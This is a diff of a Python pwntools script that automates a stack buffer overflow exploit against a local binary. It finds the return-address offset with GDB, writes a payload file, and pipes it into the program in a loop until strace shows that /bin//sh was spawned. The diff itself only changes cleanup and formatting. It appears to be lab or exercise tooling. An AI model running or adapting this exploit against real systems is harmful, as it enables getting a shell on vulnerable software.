@@ -7,19 +7,14 @@ import pty
 import select
 from pwn import *
 
-GREEN = "\033[92m"
-PINK = "\033[95m"
-RESET = "\033[0m"
 log_file_path = 'strace.log'
-
 
 
 def cleanup(exit_code: int):
 
     os.remove("trash")
     os.remove("vuln_payload")
-    os.remove("strace.log")
-    sys.exit(1)
+    # os.remove("strace.log")
     sys.exit(exit_code)
 
 
@@ -31,7 +26,7 @@ def stack_middle_address(output):
     
     if stack_line is None:
         print("GDB failed to find the stack line.")
-        sys.exit(1)
+        cleanup(1)
     
     pattern = r'\b0x[0-9a-f]+\b'
     matches = re.findall(pattern, stack_line)
@@ -44,8 +39,10 @@ def stack_middle_address(output):
 
     return middle
 
+
 def generate_test():
     return cyclic(1000)
+
 
 def locate_ra(pattern):
     gdb_proc = subprocess.Popen(
@@ -123,6 +120,7 @@ def target_ra(vuln):
 
     return output
 
+
 def construct_payload(offset, vuln):
 
     middle = stack_middle_address(target_ra(vuln))
@@ -139,6 +137,7 @@ def construct_payload(offset, vuln):
 
     open("vuln_payload", "wb").write(payload)
 
+
 def drain_fd(fd: int):
     try:
         while True:
@@ -154,6 +153,7 @@ def drain_fd(fd: int):
         print(f"An error occurred while draining the buffer: {e}")
         cleanup()
 
+
 def attach_strace():
     main_pid = os.getpid()
     strace_command = f"strace -f -e execve -p {str(main_pid)} -o strace.log"
@@ -165,7 +165,8 @@ def attach_strace():
             shell=True, 
             stderr=devnull
         )
-    
+
+
 def detect_crash(pid: int):
     pid_str = str(pid)
 
@@ -192,6 +193,7 @@ def detect_crash(pid: int):
 
     return False
 
+
 def detect_execve():
     pattern = re.compile(
         r"\d+\s+execve\(\"/bin//sh\", NULL, NULL\)\s+=\s+0"
@@ -207,20 +209,19 @@ def detect_execve():
 
     except FileNotFoundError:
         print(f"Log file '{log_file_path}' not found.")
-        sys.exit(1)
+        cleanup(1)
     except Exception as e:
         print(f"An error occurred while reading the log file: {e}")
-        sys.exit(1)
+        cleanup(1)
 
     return False
-
 
 
 def main():
         
     if len(sys.argv) != 2:
         print("No executable file provided")
-        sys.exit(1)
+        cleanup(1)
 
     vuln = sys.argv[1]
 
@@ -234,7 +235,7 @@ def main():
     exploit_command = f"cat vuln_payload - | ./{vuln} " + " ".join(["`cat trash`"] * 15)
     i = 0
     while True:
-        # print(f"{PINK}i: {i}{RESET}")
+        # print(f"i: {i}")
         i += 1
 
         master_fd, slave_fd = pty.openpty()
